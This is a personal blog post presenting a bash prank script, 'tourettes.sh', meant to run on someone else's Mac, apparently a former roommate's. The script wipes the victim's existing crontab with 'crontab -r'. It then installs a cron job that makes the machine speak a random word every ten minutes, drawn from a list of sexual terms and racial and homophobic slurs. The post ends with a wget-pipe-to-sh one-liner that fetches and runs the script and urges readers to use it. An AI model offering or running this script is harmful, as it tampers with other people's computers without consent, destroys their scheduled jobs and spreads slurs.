---
layout: post
main: false
status: completed
category: tech
back: tech.html
title: tourettes.
quote: Ear muffs.
---

There is something so deliriously enticing about using the command `say` for devious purposes outside of its developed intentions **\[aiding the visually impaired?\]**. When I first discovered my darling Mac's capability, I believe I input `wanker` immediately; after all, what is more humourous than a bot spouting swears? I'll tell you what: a bot _uncontrollably_ spewing profanity in _ten_ minute intervals ...on a less apt technologist's Mac - say my former roommate's.

<div class="snippet">
   <pre class="terminal">
<div class="terminal-header">tourettes.sh</div>
#!/bin/bash

script=/tmp/tourettes.sh
cron=/tmp/cron

setup() {
  crontab -r
}

build_script_file() {
  echo 'swear() {' >> $1
  echo 'array=("2g1c", "2 girls 1 cup", "acrotomophilia", "anal", "anilingus", "anus", "arsehole", "ass", "asshole", "assmunch", "auto erotic", "autoerotic", "babeland", "baby batter", "ball gag", "ball gravy", "ball kicking", "ball licking", "ball sack", "ball sucking", "bangbros", "bareback", "barely legal", "barenaked", "bastardo", "bastinado", "bbw", "bdsm", "beaver cleaver", "beaver lips", "bestiality", "bi curious", "big black", "big breasts", "big knockers", "big tits", "bimbos", "birdlock", "bitch", "black cock", "blonde action", "blonde on blonde action", "blow j", "blow your l", "blue waffle", "blumpkin", "bollocks", "bondage", "boner", "boob", "boobs", "booty call", "brown showers", "brunette action", "bukkake", "bulldyke", "bullet vibe", "bung hole", "bunghole", "busty", "butt", "buttcheeks", "butthole", "camel toe", "camgirl", "camslut", "camwhore", "carpet muncher", "carpetmuncher", "chocolate rosebuds", "circlejerk", "cleveland steamer", "clit", "clitoris", "clover clamps", "clusterfuck", "cock", "cocks", "coprolagnia", "coprophilia", "cornhole", "cum", "cumming", "cunnilingus", "cunt", "darkie", "date rape", "daterape", "deep throat", "deepthroat", "dick", "dildo", "dirty pillows", "dirty sanchez", "dog style", "doggie style", "doggiestyle", "doggy style", "doggystyle", "dolcett", "domination", "dominatrix", "dommes", "donkey punch", "double dong", "double penetration", "dp action", "eat my ass", "ecchi", "ejaculation", "erotic", "erotism", "escort", "ethical slut", "eunuch", "faggot", "fecal", "felch", "fellatio", "feltch", "female squirting", "femdom", "figging", "fingering", "fisting", "foot fetish", "footjob", "frotting", "fuck", "fuck buttons", "fudge packer", "fudgepacker", "futanari", "g-spot", "gang bang", "gay sex", "genitals", "giant cock", "girl on", "girl on top", "girls gone wild", "goatcx", "goatse", "gokkun", "golden shower", "goo girl", "goodpoop", "goregasm", "grope", "group sex", "guro", "hand job", "handjob", "hard core", "hardcore", "hentai", "homoerotic", "honkey", "hooker", "hot chick", "how to kill", "how to murder", "huge fat", "humping", "incest", "intercourse", "jack off", "jail bait", "jailbait", "jerk off", "jigaboo", "jiggaboo", "jiggerboo", "jizz", "juggs", "kike", "kinbaku", "kinkster", "kinky", "knobbing", "leather restraint", "leather straight jacket", "lemon party", "lolita", "lovemaking", "make me come", "male squirting", "masturbate", "menage a trois", "milf", "missionary position", "motherfucker", "mound of venus", "mr hands", "muff diver", "muffdiving", "nambla", "nawashi", "negro", "neonazi", "nig nog", "nigga", "nigger", "nimphomania", "nipple", "nipples", "nsfw images", "nude", "nudity", "nympho", "nymphomania", "octopussy", "omorashi", "one cup two girls", "one guy one jar", "orgasm", "orgy", "paedophile", "panties", "panty", "pedobear", "pedophile", "pegging", "penis", "phone sex", "piece of shit", "piss pig", "pissing", "pisspig", "playboy", "pleasure chest", "pole smoker", "ponyplay", "poof", "poop chute", "poopchute", "porn", "porno", "pornography", "prince albert piercing", "pthc", "pubes", "pussy", "queef", "raghead", "raging boner", "rape", "raping", "rapist", "rectum", "reverse cowgirl", "rimjob", "rimming", "rosy palm", "rosy palm and her 5 sisters", "rusty trombone", "sadism", "scat", "schlong", "scissoring", "semen", "sex", "sexo", "sexy", "shaved beaver", "shaved pussy", "shemale", "shibari", "shit", "shota", "shrimping", "slanteye", "slut", "smut", "snatch", "snowballing", "sodomize", "sodomy", "spic", "spooge", "spread legs", "strap on", "strapon", "strappado", "strip club", "style doggy", "suck", "sucks", "suicide girls", "sultry women", "swastika", "swinger", "tainted love", "taste my", "tea bagging", "threesome", "throating", "tied up", "tight white", "tit", "tits", "titties", "titty", "tongue in a", "topless", "tosser", "towelhead", "tranny", "tribadism", "tub girl", "tubgirl", "tushy", "twat", "twink", "twinkie", "two girls one cup", "undressing", "upskirt", "urethra play", "urophilia", "vagina", "venus mound", "vibrator", "violet blue", "violet wand", "vorarephilia", "voyeur", "vulva", "wank", "wet dream", "wetback", "white power", "women rapping", "wrapping men", "wrinkled starfish", "xx", "xxx", "yaoi", "yellow showers", "yiffy", "zoophilia")' >> $1
  echo 'exec say ${array[$((RANDOM %= $((${#array[@]}))))]}' >> $1
  echo '}' >> $1
  echo 'swear' >> $1
  chmod a+x $1
}

build_crontab_file () {
  echo "*/$1 * * * * $2" >> $3
  crontab $3
}

cleanup() {
  rm $1
}

# Remove the user's current cron.
setup

# Create a script in the tmp directory.
build_script_file "$script"

# Create a new crontab with script in tmp directory.
build_crontab_file "10" "$script" "$cron"

# Remove temp cron file.
cleanup "$cron"
    </pre>
</div>

This [little diddy](http://en.wikipedia.org/wiki/Diddy_Kong) was meant to be more refined, but it turned out to be quite difficult to check if a user had a crontab enabled, grab the contents of the current crontab, edit them, then save - all without `sudo` access. So, I settled on _brute_ force. Run it. Enjoy it.

<div class="snippet">
   <pre class="terminal">
<div class="terminal-header"><i>terminal</i></div>
wget http://frank.lovecch.io/scripts/tourettes.sh -O - | sh
   </pre>
</div>